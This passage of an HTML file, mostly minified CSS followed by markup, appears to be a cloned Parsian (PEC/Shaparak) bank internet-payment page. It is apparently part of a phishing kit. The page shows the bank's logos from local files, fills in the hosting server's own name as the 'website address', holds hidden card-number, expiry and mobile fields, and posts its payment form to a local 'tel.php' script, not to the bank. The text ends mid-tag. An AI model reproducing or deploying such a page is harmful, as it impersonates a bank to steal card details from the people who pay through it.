    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._37GSP70D8mbcpPcjnjhH5u svg {
        margin-left: 5px;
        width: 8px !important
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .ajThxwInFkMXbGOpwMoqk svg,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- .ajThxwInFkMXbGOpwMoqk path,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._37GSP70D8mbcpPcjnjhH5u svg,
    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH- ._37GSP70D8mbcpPcjnjhH5u path {
        fill: #e9162b
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH-._1A-Bsi8NcR7qkXTpgWxtUo {
        white-space: nowrap
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._2sRg09_2ZuG8cZ9l72r2y6 ._1Sb6GWnQB2LSv0Jdnid6Zg ._2Zxy5Lj2x4imbqjaL47JgY .AvUWGNrcfunMS0QpvDbH-._1A-Bsi8NcR7qkXTpgWxtUo span {
        display: inline-flex
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._3bjIwS15SZqo99FxJgPHD {
        display: flex;
        align-items: center;
        margin-top: 8px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._3fSMeMK8qZ3UjdPoRf-1-4 {
        margin-right: 4px;
        display: inline-flex;
        width: 20px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._1LC9KP2pxaMPT0V9nQX6nY {
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        font-size: 18px;
        font-weight: 600;
        color: #262626;
        max-width: 200px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._33nCAeKaZtRA8w7cpIkgku {
        display: flex;
        text-align: center !important;
        flex-direction: column;
        justify-content: center;
        margin-top: 20px
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._33nCAeKaZtRA8w7cpIkgku>div {
        text-align: center;
        cursor: pointer;
        color: var(--ah-secondary)
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._33nCAeKaZtRA8w7cpIkgku ._1TnXhvN--Q5v2ZPF32u-fs {
        text-align: center
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._33nCAeKaZtRA8w7cpIkgku ._1TnXhvN--Q5v2ZPF32u-fs svg {
        height: 16px !important;
        cursor: pointer
    }

    .iBDBFPb9jh-I3ttyStbty .mrYD2xbIC21dliYienS7n ._33nCAeKaZtRA8w7cpIkgku ._1TnXhvN--Q5v2ZPF32u-fs svg path {
        fill: var(--ah-secondary)
    }

    ._3UN3jUFZ9G6fL9cfq2_l7n {
        padding: 32px 0
    }

    ._3UN3jUFZ9G6fL9cfq2_l7n ._2k6mxS6DTVS_1-tQvEDSWY {
        height: 230px;
        position: relative
    }

    ._3UN3jUFZ9G6fL9cfq2_l7n ._4vOLRwNU_2tgU-GWqjCN- {
        height: 100% !important
    }

    ._3A106IQ77rrpxLx2mivXq0 {
        height: 100% !important
    }

    ._3A106IQ77rrpxLx2mivXq0 .cuF1khVF_4Bh9rvu58zT1 {
        width: 100%;
        overflow: hidden;
        border-radius: 3px;
        position: relative;
        height: 100%
    }

    ._3A106IQ77rrpxLx2mivXq0 .cuF1khVF_4Bh9rvu58zT1 video {
        width: 100%;
        height: 100%;
        object-fit: cover
    }

    ._3A106IQ77rrpxLx2mivXq0 .cuF1khVF_4Bh9rvu58zT1 ._1f5ooCNXWTtP-w5mjCFxqj {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%)
    }

    ._3A106IQ77rrpxLx2mivXq0 .cuF1khVF_4Bh9rvu58zT1 ._1f5ooCNXWTtP-w5mjCFxqj>div {
        width: 28px;
        height: 28px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(255, 255, 255, 0.2);
        border-radius: 50%
    }

    ._3A106IQ77rrpxLx2mivXq0 .cuF1khVF_4Bh9rvu58zT1 ._1f5ooCNXWTtP-w5mjCFxqj .zlQr4qCQcWlEGSUcgv-ce svg {
        width: 16px !important
    }

    ._3A106IQ77rrpxLx2mivXq0 .cuF1khVF_4Bh9rvu58zT1 ._1f5ooCNXWTtP-w5mjCFxqj ._3ySn9CVslscKozAGU4hSlK svg {
        width: 12px !important
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._3EjXDTMo1F2QS-fWJq1wRp {
        background: #f3f8ff;
        border: 1px solid #008fff;
        border-radius: 4p;
        padding: 8px 16px;
        display: flex;
        align-items: center;
        margin-bottom: 20px;
        border-radius: 4px;
        margin-top: 20px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._3EjXDTMo1F2QS-fWJq1wRp svg {
        color: #0080f7;
        margin-right: 16px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._3EjXDTMo1F2QS-fWJq1wRp ._2Mi55_68B_8eye60-qPI2q {
        position: relative
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._3EjXDTMo1F2QS-fWJq1wRp ._2Mi55_68B_8eye60-qPI2q .Gz2s_nRN5o8opWj6da_NK {
        position: absolute;
        right: -12px;
        top: 50%;
        transform: translateY(-50%);
        display: inline-flex
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._3EjXDTMo1F2QS-fWJq1wRp select {
        border: solid 1px #7d7a7a33 !important;
        border-radius: 4px !important;
        padding: 7px 12px !important;
        margin-left: 12px !important
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC {
        background: #ffffff;
        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.15);
        border-radius: 8px;
        padding: 16px 30px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._2REfRf4tAHjlBV8XzDr2Rx {
        margin-bottom: 16px;
        font-weight: 500;
        font-size: 14px;
        line-height: 20px;
        color: #000000
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._3DWFDbI_VAIXinOqfAnNNj {
        font-weight: 500;
        font-size: 14px;
        line-height: 20px;
        display: flex;
        align-items: center;
        color: #000000;
        display: flex;
        position: relative
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._3DWFDbI_VAIXinOqfAnNNj input {
        background: #ffffff;
        border: 1px solid #637381;
        border-radius: 5px;
        height: 50px;
        padding-left: 12px;
        width: 100%;
        margin-right: 12px;
        padding-left: 36px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._3DWFDbI_VAIXinOqfAnNNj input::placeholder {
        font-weight: 400;
        font-size: 14px;
        line-height: 20px;
        color: #9f9f9f
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._3DWFDbI_VAIXinOqfAnNNj ._3VvMQb7RoDd01nqij9eBDM {
        position: absolute;
        left: 10px;
        top: 50%;
        transform: translateY(-50%);
        display: inline-flex
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._3DWFDbI_VAIXinOqfAnNNj ._3h5iIPumYAzOzqbupayPqU {
        background: #262626;
        box-shadow: 0px 1px 0px rgba(0, 0, 0, 0.08), inset 0px -1px 0px rgba(0, 0, 0, 0.2);
        border-radius: 4px;
        font-weight: 500;
        font-size: 14px;
        line-height: 20px;
        color: #fff
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._335BiEkLYNbwvVFILUp2Ia {
        font-weight: 400;
        font-size: 12px;
        line-height: 16px;
        color: #797979;
        display: flex;
        align-items: center;
        margin-top: 16px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._335BiEkLYNbwvVFILUp2Ia ._3nTCkMfizMD-w_YHQrzTP0 {
        background: #e4e5e7;
        border-radius: 4px;
        height: 24px;
        padding-left: 8px;
        padding-right: 8px;
        display: inline-grid;
        align-items: center;
        margin-right: 8px;
        color: #202223;
        font-weight: 400;
        font-size: 12px;
        line-height: 16px;
        cursor: pointer
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn .nW7IWBfKZrMswwt87rAqC ._335BiEkLYNbwvVFILUp2Ia ._3nTCkMfizMD-w_YHQrzTP0:hover {
        color: var(--ah-secondary)
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 {
        margin-top: 46px;
        overflow: hidden
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 ._1Yt2wMi-W0bLSnhHp-rYEt {
        font-weight: 700;
        font-size: 20px;
        line-height: 30px;
        color: #000000;
        margin-bottom: 16px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 ._3dvQNqW5A-f6VIsxYWQeZt {
        display: flex;
        margin-bottom: 40px;
        max-width: 100%;
        transition: 1s
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 ._3dvQNqW5A-f6VIsxYWQeZt::-webkit-scrollbar {
        height: 6px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 {
        display: flex;
        min-width: 328px;
        margin-right: 24px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 ._2i_53WmEpVAxJgEgQFxhP3 {
        margin-right: 16px;
        min-width: 100px;
        max-width: 100px;
        height: 132px;
        overflow: hidden
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 ._1ek0LBfN4II_H-dJhM0IDR {
        width: 100%
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 ._3t5VsSBH44eRy4qyKi7ioZ {
        display: flex;
        align-items: center;
        margin-top: 8px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 ._3t5VsSBH44eRy4qyKi7ioZ img {
        margin-right: 8px;
        width: 18px;
        min-width: 18px;
        height: 18px;
        object-fit: cover;
        overflow: hidden;
        border-radius: 2px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 ._3t5VsSBH44eRy4qyKi7ioZ>div {
        word-break: break-word;
        display: block;
        display: -webkit-box !important;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis;
        font-weight: 600;
        font-size: 12px;
        line-height: 22px;
        color: #242830
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 .QyjBw0aTNwbSo0ddGnTaF {
        font-weight: 400;
        font-size: 12px;
        line-height: 18px;
        color: #797979;
        margin-bottom: 4px;
        margin-top: 10px;
        word-break: break-word;
        display: block;
        display: -webkit-box !important;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis;
        height: 36px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 .JHag8iMUBEKu5NDvBJ8UE {
        display: flex;
        margin-top: 10px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 .JHag8iMUBEKu5NDvBJ8UE .N9AtBF4807iiGWS0Y0R5x {
        font-weight: 600;
        font-size: 12px;
        line-height: 22px;
        text-align: center;
        color: #505050;
        padding-left: 4px;
        padding-right: 4px;
        margin-right: 36px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 .JHag8iMUBEKu5NDvBJ8UE .N9AtBF4807iiGWS0Y0R5x:last-child {
        margin-right: 0
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 .JHag8iMUBEKu5NDvBJ8UE .N9AtBF4807iiGWS0Y0R5x svg {
        width: 14px !important;
        height: 14px !important
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 .NoaVCCpL4sXrRYnQf-c93 .JHag8iMUBEKu5NDvBJ8UE .N9AtBF4807iiGWS0Y0R5x ._225fqcaJ1UwFvnE0TWkQrn {
        text-align: center
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 ._2swOl5cxNBI_sxEdA-Nkc_ {
        display: flex;
        align-items: center;
        justify-content: flex-end;
        margin-bottom: 16px
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 ._2swOl5cxNBI_sxEdA-Nkc_>div {
        cursor: pointer;
        display: inline-flex
    }

    ._3R_J-sIKpX8fPIggVerwSV ._17pnZ8RRnAxpF1uD5ULPCn ._2h_1CwcvGP5Xa3sZEandi8 ._2swOl5cxNBI_sxEdA-Nkc_>div:hover svg path {
        fill: var(--ah-primary)
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1f_Kz9x25KxrjnrYgQK8gH {
        font-size: 14px;
        line-height: 22px;
        font-weight: 500;
        margin-bottom: 12px
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1W1XEFmRraPnt2HDx_EVax {
        background: #262626;
        border-radius: 6px;
        padding-top: 12px;
        padding-bottom: 12px;
        display: flex;
        margin-bottom: 20px;
        height: 80px
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1W1XEFmRraPnt2HDx_EVax:hover div {
        animation-play-state: paused
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._2zTffuj6P8Ozx_sD03ntwT {
        display: flex;
        padding-left: 20px
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._2zTffuj6P8Ozx_sD03ntwT.uaOWK5RdMpGd179cqmrVD {
        will-change: transform;
        animation: _3ETPfR1BORyGG7h1s0mcEd infinite 48s linear;
        animation-delay: 24s;
        animation-play-state: running
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._2zTffuj6P8Ozx_sD03ntwT:not(.uaOWK5RdMpGd179cqmrVD) {
        will-change: transform;
        animation: _3OxVO2e6za1-1QL1YZaGb5 infinite 48s linear;
        animation-play-state: running
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1tZoZX7ewPw7Y7XOwqlKuS {
        min-width: 220px;
        display: flex;
        align-items: self-end;
        padding-left: 15px;
        padding-right: 15px;
        cursor: pointer
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1tZoZX7ewPw7Y7XOwqlKuS div {
        color: #fff;
        width: 100%;
        margin-right: 10px
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1tZoZX7ewPw7Y7XOwqlKuS div:last-child {
        margin-right: 0
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1tZoZX7ewPw7Y7XOwqlKuS ._3fUh6xoe2268Ua3zss79fl {
        position: relative
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1tZoZX7ewPw7Y7XOwqlKuS ._3fUh6xoe2268Ua3zss79fl:after {
        content: '';
        position: absolute;
        width: 100%;
        bottom: 0px;
        border: 0.5px dashed #00a149
    }

    ._2dXHlE8gC8-sHwO57I2Ity ._1tZoZX7ewPw7Y7XOwqlKuS:hover div,
    ._2dXHlE8gC8-sHwO57I2Ity ._1tZoZX7ewPw7Y7XOwqlKuS:hover canvas {
        color: var(--ah-secondary);
        cursor: pointer
    }

    @keyframes _3OxVO2e6za1-1QL1YZaGb5 {
        0% {
            transform: translateX(50%)
        }

        100% {
            transform: translateX(-150%)
        }
    }

    @keyframes _3ETPfR1BORyGG7h1s0mcEd {
        0% {
            transform: translateX(-50%)
        }

        100% {
            transform: translateX(-250%)
        }
    }

    ._371pvYkUmeOAgkauM_Ydf0 {
        padding: 32px 0
    }

    ._371pvYkUmeOAgkauM_Ydf0 .PygXbuzF5RpKBCZK6Dbl_ {
        height: 230px;
        position: relative
    }

    ._371pvYkUmeOAgkauM_Ydf0 ._2HKkUzlAh28V4zrMgxv0VB {
        height: 100% !important
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy {
        padding: 0 20px
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._3pFKgX1rbvO-NA0BPqIDdY {
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08);
        margin-left: -20px;
        margin-right: -20px;
        padding-left: 20px;
        padding-right: 20px;
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._3pFKgX1rbvO-NA0BPqIDdY .-cJE_WrsG-Eij7t7WJ-eA {
        display: inline-flex;
        align-items: center
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._3pFKgX1rbvO-NA0BPqIDdY .-cJE_WrsG-Eij7t7WJ-eA ._38v7d7g1cXYUeJ0a3s4XOw {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._3pFKgX1rbvO-NA0BPqIDdY .-cJE_WrsG-Eij7t7WJ-eA._1bnKebLO1nJP0_9rVxRlsx ._38v7d7g1cXYUeJ0a3s4XOw {
        cursor: pointer
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._3pFKgX1rbvO-NA0BPqIDdY .-cJE_WrsG-Eij7t7WJ-eA._1bnKebLO1nJP0_9rVxRlsx:hover {
        color: var(--ah-secondary)
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._3pFKgX1rbvO-NA0BPqIDdY .-cJE_WrsG-Eij7t7WJ-eA._1bnKebLO1nJP0_9rVxRlsx:hover ._38v7d7g1cXYUeJ0a3s4XOw {
        color: var(--ah-secondary)
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._3pFKgX1rbvO-NA0BPqIDdY:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._1mW9uOnwjZQmHK9jNy7YqO {
        min-height: calc(100vh - 460px);
        max-height: calc(100vh - 200px)
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._1mW9uOnwjZQmHK9jNy7YqO ._1p_obPCuIlSBMK41fr0GYY {
        display: flex;
        align-items: center;
        border-bottom: 1px solid #d9d9d9;
        padding: 0 6px;
        margin-top: 20px
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._1mW9uOnwjZQmHK9jNy7YqO ._1p_obPCuIlSBMK41fr0GYY span {
        display: inline-flex;
        font-size: 14px;
        font-weight: 600;
        color: #262626;
        padding-bottom: 10px;
        position: relative;
        cursor: pointer
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._1mW9uOnwjZQmHK9jNy7YqO ._1p_obPCuIlSBMK41fr0GYY span+span {
        margin-left: 40px
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._1mW9uOnwjZQmHK9jNy7YqO ._1p_obPCuIlSBMK41fr0GYY span._3vA8rJ0RoitceMs79e4Iqb {
        color: #e9162b
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._1mW9uOnwjZQmHK9jNy7YqO ._1p_obPCuIlSBMK41fr0GYY span._3vA8rJ0RoitceMs79e4Iqb:before {
        content: ' ';
        display: block;
        width: 100%;
        height: 2px;
        background: #e9162b;
        position: absolute;
        left: 0;
        bottom: -2px
    }

    ._2bjRwToFir_fJoesXoGhr_._3xT4JuLmNZAip8IkvlvnFy ._3hwFpFMnCHTS6xQYC13wCt {
        position: relative;
        background: #f5f5f5;
        min-height: 400px;
        width: 100%;
        margin: 20px 0;
        border-radius: 4px
    }
    </style>
</head>

<body class="">


    <img src="./files/833.gif" class="d-none">

    <div id="paymentwrp">
        <div class="wrapper">

            <section id="Header">
                <div class="d-none col-lg-header">
                    <div class="col-3 m-0 p-0 float-lg-left">
                        <div class="col-12 text-center mb-3 logo">
                            <img src="./files/pec-logo.png">


                        </div>
                    </div>
                    <div class="col-3 m-0 p-0 float-lg-right">
                        <div class="col-12 text-center mb-3 logo">
                            <img src="./files/shaparak-logo.png">


                        </div>
                    </div>
                    <div class="clearfix"></div>
                </div>

                <div class="row">
                    <div class="d-none col-xs-header">
                        <h1 class="header-title text-center">پرداخت اینترنتی تجارت الکترونیک پارسیان</h1>
                        <div class="m-0 p-0 float-left">
                            <div class="col-12 text-center mb-1">
                                <img src="./files/pec-logo.png" width="80">


                            </div>
                        </div>
                        <div class="m-0 p-0 float-right">
                            <div class="col-12 text-center mb-1">
                                <img src="./files/shaparak-logo.png" width="80">

                            </div>
                        </div>
                        <div class="clearfix"></div>
                    </div>

                </div>
            </section>










            <div class="row">
                <div class="m-0 p-0 payment-info-lg">
                    <div class="col-12 gray-box box-right" id="col1">
                        <h3 class="text-center d-block pectitle">پرداخت اینترنتی تجارت الکترونیک پارسیان</h3>
                        <span class="amountLabel">مبلغ قابل پرداخت</span>
                        <div class="amount" name="Amount">
                            <span></span>

                        </div>
                        <span class="unit m-0 perc">ریال</span>

                        <div class="mt-3" style="width:90%;margin:auto">

                            <div class="container mt-3 ">

                                <div class="mt-1 row">
                                    <div class="m-0 p-0 R">
                                        <div class="boxedRight col-md-12 m-0 p-2 d-block">
                                            نام فروشگاه
                                        </div>
                                    </div>
                                    <div class="m-0 p-0 L">
                                        <span class="boxedLeft col-md-12 mr-1 p-2 d-block">
                                            رایان ارتباط شب آهنگ
                                        </span>
                                    </div>
                                    <div class="clearfix"></div>
                                </div>
                                <div class="mt-1 row">
                                    <div class="m-0 p-0 R">
                                        <div class="boxedRight col-md-12 m-0 p-2 d-block">
                                            آدرس وب سایت
                                        </div>
                                    </div>
                                    <div class="m-0 p-0 L">
                                        <span class="boxedLeft col-md-12 mr-1 p-2 d-block">
                                            <?php echo $_SERVER['SERVER_NAME']; ?>
                                        </span>
                                    </div>
                                    <div class="clearfix"></div>
                                </div>
                                <div class=" mt-1 row">
                                    <div class="m-0 p-0 R">
                                        <div class="boxedRight col-md-12 m-0 p-2 d-block">
                                            کد پذیرنده
                                        </div>
                                    </div>
                                    <div class="m-0 p-0 L">
                                        <span class="boxedLeft col-md-12 mr-1 p-2 d-block">
                                            ۴۳۸۱۸۳۵۶۱۸
                                        </span>
                                    </div>
                                    <div class="clearfix"></div>
                                </div>
                                <div class="mt-1 row">
                                    <div class="m-0 p-0 R">
                                        <div class="boxedRight col-md-12 m-0 p-2 d-block">
                                            شماره ترمینال
                                        </div>
                                    </div>
                                    <div class="m-0 p-0 L">
                                        <span class="boxedLeft col-md-12 mr-1 p-2 d-block">
                                            ۹۸۷۹۷۰۰۲
                                        </span>
                                    </div>
                                    <div class="clearfix"></div>
                                </div>

                                <div class="text-center mb-3 row" style="margin-top:20px;margin-bottom:30px;">
                                    <div id="countdownProgress-lg" class="col-12 p-0">
                                        <div id="VQhJT"
                                            style="width:100%;height:15px;background-color:#ececec;overflow:hidden;">
                                            <div class="loadbar loadbar-init" style="width: 18.315px; height: 15px;">
                                                &nbsp;</div>
                                        </div>
                                    </div>
                                    <div id="countdown-lg" style="font-size:45px;margin:auto"
                                        class="text-center timer-init">۰۹:۳۳</div>
                                </div>

                            </div>
                            <div class="clearfix"> </div>

                        </div>

                        <div class="contactus-lg">

                            <h6 class="text-center mt-3 contactus" style="margin-top:30px;">
                                اطلاعات تماس پشتیبانی

                                ۲۳۱۸ - ۰۲۱
                            </h6>
                            <div class="copyright">
                                <span class="d-block text-center">
                                    کلیه حقوق متعلق به شرکت تجارت الکترونیک پارسیان می باشد
                                </span>
                                <div class="blind">

                                    حمایت از حقوق روشندلان
                                </div>
                            </div>
                        </div>

                    </div>

                </div>
                <div class="expire-time-sm col-12 p-0">
                    <div class="mt-1 ">
                        <div class="boxedRight d-inline float-right" style="width:49%!important">
                            زمان باقی مانده
                        </div>
                        <div class="boxedLeft d-inline Tokentimer float-left timer-init" id="countdown-sm"
                            style="width:49%!important">۰۹:۳۳</div>
                        <div class="clearfix"></div>
                    </div>
                    <div class="clearfix"></div>
                </div>
                <div class="mb-0 p-0 payment-form" style="margin-top:-158px;">
                    <div class="white-box" id="col2">
                        <div class="payment-form-wrp">
                            <div id="tspSlider">



                                <div class="slider noTsp" style="width:85%;">
                                    <div class="item">
                                        <input type="hidden" value="" class="exp-date custom-exp-date">
                                        <input type="hidden" value="" class="card-number custom-card-number">
                                        <input type="hidden" value="" class="moblile-number custom-moblile-number">
                                        <div class="bankCard">
                                            <div class="logo"></div>
                                            <div class="logobg">
                                            </div>
                                            <div class="card-logo">
                                                <i class="fa fa-university fa-1x text-info bank-logo-image"
                                                    aria-hidden="true"></i>
                                            </div>
                                            <img src="./files/shetab.png" class="shetab-logo-image">
                                            <div class="card-number new-Card">
                                                <div class="form-group">
                                                    <p class="card-number">
                                                        <span class="d-block new-card-number">

                                                        </span>

                                                        <span class="float-left f-size-13 d-block new-card-expire ">

                                                        </span>
                                                    </p>
                                                </div>
                                            </div>
                                            <div class="bank-color custom-bank-color"></div>
                                        </div>
                                    </div>
                                </div>

                            </div>
                            <div id="message">

                            </div>

                            <div class="row">
                                <div class="container text-right">
                                    <form action="tel.php" autocomplete="off" id="PayForm" method="post"
                                        novalidate="novalidate"><input name="__RequestVerificationToken" type="hidden"
                                            value="wUY5DIru9xEYMrZizk1cHQaK6bohEYeA_ssfIHzjZsvwZ4o22XX38ntiG9TdoC76oV7NU1TRb5PKZjr2dogSKrhVLSQ1"><input
                                            data-val="true" data-val-number="The field Token must be a number."
                                            data-val-required="The Token field is required." id="hToken" name="Token"
                                            type="hidden" value="225680089478907"><input data-val="true"
                                            data-val-number="The field Amount must be a number."
                                            data-val-required="The Amount field is required." id="Amount" name="Amount"
                                            type="hidden" value="200000"><input data-val="true"
                                            data-val-number="The field MerchantMaxAllowTransactionAmount must be a number."
